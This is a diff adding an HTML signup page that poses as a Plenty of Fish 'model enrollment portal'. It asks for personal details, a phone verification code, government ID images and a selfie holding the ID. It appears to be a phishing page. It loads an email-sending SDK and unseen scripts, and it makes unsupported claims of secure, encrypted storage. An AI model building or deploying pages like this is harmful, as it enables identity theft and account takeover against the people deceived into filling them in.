@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Plenty of Fish — Become a Model</title>
+  <link rel="stylesheet" href="css/styles.css" />
+</head>
+<body>
+
+  <!-- ── Site Header ──────────────────────────────────── -->
+  <header class="site-header">
+    <a class="logo" href="#">
+      <div class="logo-mark">
+        <img src="icon.png" alt="Plenty of Fish" />
+      </div>
+      Plenty of Fish
+    </a>
+    <p>Model enrollment portal &mdash; powered by POF</p>
+  </header>
+
+  <!-- ── Card ─────────────────────────────────────────── -->
+  <div class="card">
+
+    <!-- Progress -->
+    <div class="progress-header">
+      <div class="step-labels">
+
+        <div class="step-label active">
+          <div class="step-bubble active" id="bubble-1">1</div>
+          <div class="step-name active"   id="name-1">Profile</div>
+        </div>
+
+        <div class="step-label">
+          <div class="step-bubble" id="bubble-2">2</div>
+          <div class="step-name"   id="name-2">Phone</div>
+        </div>
+
+        <div class="step-label">
+          <div class="step-bubble" id="bubble-3">3</div>
+          <div class="step-name"   id="name-3">Identity</div>
+        </div>
+
+        <div class="step-label">
+          <div class="step-bubble" id="bubble-4">4</div>
+          <div class="step-name"   id="name-4">Done</div>
+        </div>
+
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progress-fill" style="width: 8%"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════
+         STEP 1 — Profile
+    ══════════════════════════════════════════════════ -->
+    <section class="step-panel active" id="step-1">
+      <h2>Join as a POF model</h2>
+      <p class="subtitle">Create your profile to get started. Verified models appear with a badge on Plenty of Fish. All fields marked <span style="color:var(--brand)">*</span> are required.</p>
+
+      <div class="alert" id="step1-alert"></div>
+
+      <div class="form-row">
+        <div class="field">
+          <label for="firstName">First Name <span class="req">*</span></label>
+          <input type="text" id="firstName" placeholder="e.g. Amara" autocomplete="given-name" />
+          <div class="err-msg">First name is required.</div>
+        </div>
+        <div class="field">
+          <label for="lastName">Last Name <span class="req">*</span></label>
+          <input type="text" id="lastName" placeholder="e.g. Johnson" autocomplete="family-name" />
+          <div class="err-msg">Last name is required.</div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="email">Email Address <span class="req">*</span></label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="email" />
+        <div class="err-msg">Enter a valid email address.</div>
+      </div>
+
+      <div class="field">
+        <label>Phone Number <span class="req">*</span></label>
+        <div class="phone-wrap" id="phone-wrap">
+          <select id="phoneCode" aria-label="Country code">
+            <option value="+1" selected>🇺🇸 +1</option>
+            <option value="+44">🇬🇧 +44</option>
+          </select>
+          <input type="tel" id="phone" placeholder="202 555 0123" autocomplete="tel" />
+        </div>
+        <div class="err-msg" id="phone-err" style="display: none">Enter a valid phone number.</div>
+      </div>
+
+      <div class="form-row">
+        <div class="field">
+          <label for="dob">Date of Birth <span class="req">*</span></label>
+          <input type="date" id="dob" />
+          <div class="err-msg">You must be at least 18 years old.</div>
+        </div>
+        <div class="field">
+          <label for="gender">Gender <span class="req">*</span></label>
+          <select id="gender">
+            <option value="">Select...</option>
+            <option>Female</option>
+            <option>Male</option>
+            <option>Non-binary</option>
+            <option>Prefer not to say</option>
+          </select>
+          <div class="err-msg">Please select your gender.</div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="social">Instagram / Social Handle</label>
+        <input type="text" id="social" placeholder="@yourhandle (optional)" />
+      </div>
+
+      <!-- POF account question -->
+      <div class="field">
+        <label>Do you already have a POF account? <span class="req">*</span></label>
+        <div class="pof-toggle">
+          <label class="toggle-opt" id="pof-yes-label">
+            <input type="radio" name="pofAccount" value="yes" onchange="togglePofUsername(true)" />
+            <span class="tog-icon">🐟</span>
+            <span>Yes, I do</span>
+          </label>
+          <label class="toggle-opt" id="pof-no-label">
+            <input type="radio" name="pofAccount" value="no" onchange="togglePofUsername(false)" />
+            <span class="tog-icon">➕</span>
+            <span>Not yet</span>
+          </label>
+        </div>
+        <div class="err-msg" id="pof-account-err" style="display: none">Please tell us if you have a POF account.</div>
+      </div>
+
+      <!-- Revealed only when "Yes" is selected -->
+      <!-- <div class="pof-username-reveal" id="pofUsernameReveal">
+        <div class="field">
+          <label for="pofUsername">Your POF Username <span class="req">*</span></label>
+          <input type="text" id="pofUsername" placeholder="@your_pof_username" autocomplete="username" />
+          <div class="err-msg">Please enter your POF username.</div>
+        </div>
+      </div> -->
+
+      <hr class="divider" />
+
+      <div class="terms-row">
+        <input type="checkbox" id="terms" />
+        <label for="terms">
+          I agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>,
+          and confirm I am 18 years of age or older.
+        </label>
+      </div>
+
+      <button class="btn-primary" onclick="goStep2()">
+        Continue &rarr;
+      </button>
+    </section>
+
+    <!-- ══════════════════════════════════════════════════
+         STEP 2 — Phone OTP
+    ══════════════════════════════════════════════════ -->
+    <section class="step-panel" id="step-2">
+      <button class="btn-back" onclick="goStep(1)">
+        <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+        Back
+      </button>
+
+      <h2>Verify your phone</h2>
+      <p class="subtitle">Enter the 6-digit code we sent to confirm this number belongs to you. This keeps your POF model profile secure.</p>
+
+      <div class="otp-sent-info">
+        <div class="otp-icon">📱</div>
+        <p>Code sent to <strong id="otp-phone-display"></strong></p>
+      </div>
+
+      <div class="alert" id="otp-alert"></div>
+
+      <div class="otp-wrap">
+        <input class="otp-box" type="text" maxlength="1" id="o1" inputmode="numeric" aria-label="Digit 1" />
+        <input class="otp-box" type="text" maxlength="1" id="o2" inputmode="numeric" aria-label="Digit 2" />
+        <input class="otp-box" type="text" maxlength="1" id="o3" inputmode="numeric" aria-label="Digit 3" />
+        <input class="otp-box" type="text" maxlength="1" id="o4" inputmode="numeric" aria-label="Digit 4" />
+        <input class="otp-box" type="text" maxlength="1" id="o5" inputmode="numeric" aria-label="Digit 5" />
+        <input class="otp-box" type="text" maxlength="1" id="o6" inputmode="numeric" aria-label="Digit 6" />
+      </div>
+
+      <div class="resend-row">
+        Didn't get it?
+        <button class="resend-btn" id="resendBtn" disabled onclick="resendOtp()">
+          Resend in <span id="countdown">60s</span>
+        </button>
+      </div>
+
+      <button class="btn-primary" onclick="verifyOtp()">
+        Verify &amp; Continue
+      </button>
+    </section>
+
+    <!-- ══════════════════════════════════════════════════
+         STEP 3 — Identity Verification
+    ══════════════════════════════════════════════════ -->
+    <section class="step-panel" id="step-3">
+      <button class="btn-back" onclick="goStep(2)">
+        <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+        Back
+      </button>
+
+      <h2>Identity verification</h2>
+      <p class="subtitle">POF requires all models to verify their identity. Upload a government-issued ID — your documents are encrypted and stored securely.</p>
+
+      <div class="alert" id="id-alert"></div>
+
+      <!-- ID type -->
+      <p class="id-type-label">Select ID type <span style="color:var(--brand)">*</span></p>
+      <div class="verify-cards">
+        
+        <label class="verify-card" id="vc-driver">
+          <input type="radio" name="idType" value="driver" onchange="selectIdType(this)" />
+          <div class="vc-icon">🚗</div>
+          <div class="vc-label">Driver's License</div>
+          <div class="vc-sub">Front &amp; back</div>
+        </label>
+        
+        <label class="verify-card" id="vc-passport">
+          <input type="radio" name="idType" value="passport" onchange="selectIdType(this)" />
+          <div class="vc-icon">🛂</div>
+          <div class="vc-label">Passport</div>
+          <div class="vc-sub">International</div>
+        </label>
+      </div>
+
+      <!-- Front -->
+      <p class="upload-label">Front of ID <span style="color:var(--brand)">*</span></p>
+      <label class="upload-zone" id="frontZone">
+        <input type="file" accept="image/*,.pdf" id="frontFile" onchange="fileSelected('front', this)" />
+        <div class="uz-icon">📄</div>
+        <div class="uz-label">Click to upload front of ID</div>
+        <div class="uz-sub">JPG, PNG or PDF &middot; Max 5 MB</div>
+        <div class="uz-file" id="frontFileName"></div>
+      </label>
+
+      <!-- Back (driver / national only) -->
+      <div id="backSection" style="display: none">
+        <p class="upload-label">Back of ID <span style="color:var(--brand)">*</span></p>
+        <label class="upload-zone" id="backZone">
+          <input type="file" accept="image/*,.pdf" id="backFile" onchange="fileSelected('back', this)" />
+          <div class="uz-icon">📄</div>
+          <div class="uz-label">Click to upload back of ID</div>
+          <div class="uz-sub">JPG, PNG or PDF &middot; Max 5 MB</div>
+          <div class="uz-file" id="backFileName"></div>
+        </label>
+      </div>
+
+      <!-- Selfie -->
+      <div class="selfie-note">
+        <span class="note-icon">💡</span>
+        <span>Hold your ID next to your face and take a clear photo. Both your face and the ID text must be fully visible and in focus.</span>
+      </div>
+
+      <p class="upload-label">Selfie with ID <span style="color:var(--brand)">*</span></p>
+      <label class="upload-zone" id="selfieZone">
+        <input type="file" accept="image/*" capture="user" id="selfieFile" onchange="fileSelected('selfie', this)" />
+        <div class="uz-icon">🤳</div>
+        <div class="uz-label">Click to upload selfie holding your ID</div>
+        <div class="uz-sub">JPG or PNG &middot; Front camera recommended</div>
+        <div class="uz-file" id="selfieFileName"></div>
+      </label>
+
+      <button class="btn-primary" onclick="submitVerification()">
+        Submit for Review
+      </button>
+    </section>
+
+    <!-- ══════════════════════════════════════════════════
+         STEP 4 — Success
+    ══════════════════════════════════════════════════ -->
+    <section class="step-panel" id="step-4">
+      <div class="success-screen">
+
+        <div class="check-anim">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+
+        <h2>You're in the pond! 🐟</h2>
+        <p class="desc">
+          Welcome, <strong id="success-name"></strong>! Your POF model application has been submitted and is under review by our team.
+        </p>
+
+        <div class="status-badge">
+          <div class="pulse-dot"></div>
+          Pending Review &mdash; 24–48 hrs
+        </div>
+
+        <p class="success-email-note">
+          A confirmation will be sent to<br>
+          <strong id="success-email"></strong> once your identity is verified.<br><br>
+          <!-- Once approved, your profile will appear on Plenty&nbsp;of&nbsp;Fish with a verified model badge. -->
+        </p>
+
+      </div>
+    </section>
+
+    <!-- Card footer -->
+    <footer class="card-footer">
+      <span>🔒 256-bit encryption</span>
+      <div class="dot"></div>
+      <a href="#">Privacy Policy</a>
+      <div class="dot"></div>
+      <a href="#">POF Support</a>
+    </footer>
+
+  </div><!-- /card -->
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <!-- POF email helpers (must load before main.js) -->
+  <script src="js/email.js"></script>
+  <script src="js/main.js"></script>
+</body>
+</html>
